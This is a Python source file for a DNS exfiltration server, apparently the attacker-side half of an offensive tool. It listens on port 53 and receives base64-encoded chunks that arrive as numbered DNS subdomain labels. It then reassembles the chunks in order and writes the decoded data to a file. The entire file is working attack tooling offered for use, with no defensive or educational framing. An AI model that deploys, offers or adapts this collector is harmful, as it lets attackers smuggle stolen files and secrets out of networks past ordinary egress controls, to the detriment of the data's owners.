#!/usr/bin/env python3

import argparse
import base64
import time
from typing import Dict

from colorama import Fore, Style, init
from dnslib import A, QTYPE, RR
from dnslib.server import DNSLogger, DNSServer, BaseResolver

init(autoreset=True)


class CustomDNSLogger(DNSLogger):
    """Simple colored console logger for incoming DNS queries."""

    def __init__(self) -> None:
        super().__init__()
        self.processed_queries = set()

    def log_request(self, handler, request) -> None:  # type: ignore[override]
        query_name = str(request.q.qname)
        if query_name not in self.processed_queries:
            print(
                f"{Style.BRIGHT}{Fore.GREEN}[+] "
                f"{Style.BRIGHT}{Fore.CYAN}Received DNS query for: "
                f"{Fore.YELLOW}{query_name}"
            )
            self.processed_queries.add(query_name)

    def log_reply(self, handler, reply) -> None:  # type: ignore[override]
        # We keep responses minimal and do not spam the console.
        return


class ExfiltrationResolver(BaseResolver):
    """
    Resolver that reconstructs exfiltrated data from DNS queries.

    The client sends queries in the form:

        NNN-<base64_chunk>.<domain>

    where NNN is a zero-padded chunk index. We collect all chunks in-memory,
    reconstruct the base64 stream in order, decode it to bytes, and write the
    result to `output_file`.
    """

    def __init__(self, output_file: str) -> None:
        super().__init__()
        self.data_chunks: Dict[str, str] = {}
        self.output_file = output_file

    def resolve(self, request, handler):  # type: ignore[override]
        query_name = str(request.q.qname)
        print(
            f"{Style.BRIGHT}{Fore.GREEN}[+] "
            f"{Style.BRIGHT}{Fore.MAGENTA}Saving the received data to {self.output_file}..."
        )

        try:
            # Extract the left-most label "NNN-<base64_chunk>".
            subdomain = query_name.split(".", 1)[0]
            if "-" not in subdomain:
                raise ValueError("Malformed label (missing chunk separator '-')")

            chunk_id, encoded_data = subdomain.split("-", 1)

            # Only accept zero-padded numeric IDs.
            if not (len(chunk_id) == 3 and chunk_id.isdigit()):
                raise ValueError(f"Invalid chunk ID format: {chunk_id!r}")

            # Store the raw base64 slice as received.
            self.data_chunks[chunk_id] = encoded_data

            # Try to decode and display the current chunk as text for convenience.
            try:
                padding = len(encoded_data) % 4
                if padding:
                    encoded_for_display = encoded_data + ("=" * (4 - padding))
                else:
                    encoded_for_display = encoded_data

                decoded_bytes = base64.b64decode(encoded_for_display)
                # Attempt to display as UTF-8, falling back to replacement characters.
                decoded_chunk = decoded_bytes.decode("utf-8", errors="replace")
                print(
                    f"{Style.BRIGHT}{Fore.GREEN}[+] "
                    f"{Style.BRIGHT}{Fore.CYAN}Received chunk {chunk_id}: "
                    f"{Fore.YELLOW}{decoded_chunk}"
                )
            except Exception as e:
                print(
                    f"{Fore.YELLOW}[!] Could not decode chunk {chunk_id} for display: {e}"
                )

            # Try to write to file after each chunk.
            self.try_write_to_file()

            reply = request.reply()
            # Minimal dummy A record indicating the query was handled.
            reply.add_answer(
                RR(query_name, QTYPE.A, rdata=A("0.0.0.0"), ttl=60)  # type: ignore[arg-type]
            )
            return reply

        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process query: {e}")
            reply = request.reply()
            # NXDOMAIN to indicate failure to the client (which tolerates this).
            reply.header.rcode = 3
            return reply

    def try_write_to_file(self) -> None:
        """Try to write the current data to file as binary."""
        try:
            # Get all available chunks in order (000, 001, 002, ...).
            available_chunks = []
            i = 0
            while str(i).zfill(3) in self.data_chunks:
                available_chunks.append(self.data_chunks[str(i).zfill(3)])
                i += 1

            if not available_chunks:
                return

            # Combine the base64 chunks into a single string.
            combined_data = "".join(available_chunks)

            # Add padding if needed.
            padding = len(combined_data) % 4
            if padding:
                combined_data += "=" * (4 - padding)

            try:
                decoded_bytes = base64.b64decode(combined_data)
                with open(self.output_file, "wb") as f:
                    f.write(decoded_bytes)
                    f.flush()
                print(
                    f"{Style.BRIGHT}{Fore.GREEN}[+] "
                    f"{Style.BRIGHT}{Fore.GREEN}Data written to {self.output_file}"
                )
            except Exception as e:
                print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to decode/write data: {e}")
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process chunks: {e}")

    def save_file(self, filename: str) -> None:
        """Final save attempt when server is shutting down."""
        self.try_write_to_file()


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration server.")
    parser.add_argument(
        "-o",
        "--output",
        required=True,
        help="Path to the output file.",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="Server listening port. Default is 53.",
    )
    return parser.parse_args()


def init_server(port: int, logger, output_file: str):
    """Initialize and start the DNS server."""
    resolver = ExfiltrationResolver(output_file)
    server = DNSServer(resolver, port=port, address="0.0.0.0", logger=logger)
    server.start_thread()
    return server, resolver


if __name__ == "__main__":
    try:
        args = parse_args()
        logger = CustomDNSLogger()
        server, resolver = init_server(args.port, logger, args.output)

        print(f"{Fore.GREEN}{Style.BRIGHT}[+] DNS Server started...")
        # Avoid busy-waiting and keep CPU usage low while the server thread runs.
        while server.isAlive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}\n[+] Saving the received data to file...")
        resolver.save_file(args.output)
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[-] Error: {e}")
        exit(1)